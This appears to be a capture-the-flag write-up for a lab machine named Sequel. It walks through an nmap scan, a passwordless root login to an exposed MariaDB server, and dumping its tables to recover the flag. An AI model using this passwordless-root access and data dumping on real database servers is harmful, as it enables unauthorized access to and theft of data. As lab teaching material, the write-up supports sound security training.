---
OS: Linux
Level: Very Easy
Skills: MySQL
tags: [linux, database, mysql]
---
# 🐬 Sequel
<div class="machine-properties">
  <span class="prop-badge linux">Linux</span> <span class="prop-badge very-easy">Very Easy</span> <span class="prop-badge skills">MySQL</span>
</div>


Sequel is a **Very Easy** Linux box that demonstrates how a MariaDB service misconfigured to allow root access without a password can lead to full database enumeration and data exfiltration — no exploit required.

---

## Recon

A full port scan reveals a single open port — **MySQL/MariaDB** on 3306:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.12.166

PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 63
```

A service scan identifies **MariaDB 10.3.27** on Debian 10 with `mysql_native_password` authentication:

```
$ nmap -sCV -p3306 10.129.12.166

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 207
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: nVB*Hkc0c#!zhyJBNA:@
|_  Auth Plugin Name: mysql_native_password
```

**Key findings:**
- **MariaDB on 3306** — the only open port; the entire attack surface is the database
- **MariaDB 10.3.27 on Debian 10** — no known RCE vulnerabilities at this version; the vector is authentication
- **`mysql_native_password` plugin** — indicates the server expects a password, but Debian-based installs often allow root without one via `unix_socket` locally; if `bind-address` was changed to `0.0.0.0`, remote root access may still be passwordless

---

## Foothold

### Step 1 — Connect as root with no password

Attempt a connection as `root` with no credentials — the most common MariaDB/MySQL misconfiguration on CTF boxes:

```
$ mysql -h 10.129.12.166 -u root --ssl=0

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 177
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

The connection succeeds immediately — no password prompt. `root` has unrestricted access. (`--ssl=0` disables SSL/TLS since the CTF server uses a self-signed or no certificate.)

### Step 2 — Enumerate databases

List all databases on the server:

```
MariaDB [(none)]> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.070 sec)
```

Four databases. The `htb` database stands out as non-default — `mysql`, `information_schema`, and `performance_schema` are system databases.

### Step 3 — Explore the `htb` database

Switch to the target database and list its tables:

```
MariaDB [(none)]> USE htb;
Database changed

MariaDB [htb]> SHOW TABLES;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.061 sec)
```

Two tables — `config` and `users`. Dump both:

```
MariaDB [htb]> SELECT * FROM users;

+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.078 sec)

MariaDB [htb]> SELECT * FROM config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.064 sec)
```

The flag is recovered from row 5 of the `config` table — a plaintext value among other application settings with no encryption or access controls. The `users` table contains four accounts but no password hashes, confirming that the database itself was the target, not credential reuse.

> 💡 **Why this works:** MariaDB installations on Debian-based systems allow root login without a password via `unix_socket` authentication locally. When `bind-address` is changed from `127.0.0.1` to `0.0.0.0` (to expose the service to the network), administrators often forget to set a password for remote root access. This is the MySQL equivalent of MongoDB's default `authorization: disabled` — a textbook CTF misconfiguration.

---

## Key Takeaways

- **Always test `mysql -h <IP> -u root` with no password first** — it's the MySQL equivalent of anonymous FTP and is surprisingly common on CTF boxes
- **`SHOW DATABASES;` → `SHOW TABLES;` → `SELECT *`** is the MySQL enumeration trifecta — once you're in, data exfiltration is trivial
- **Non-default database names are dead giveaways** — `htb` stood out immediately among the three system databases
- **`--ssl=0` may be needed on CTF servers** — self-signed or missing certificates can block the connection if SSL is attempted
- No privilege escalation was needed — root MySQL access exposed the flag directly with no further exploitation required

## 🔗 Related

- [[🐬 MySQL]] — MySQL/MariaDB enumeration & exploitation
- [[📅 Appointment]] — SQL injection via web login
- [[👹 Mongod]] — MongoDB NoSQL enumeration
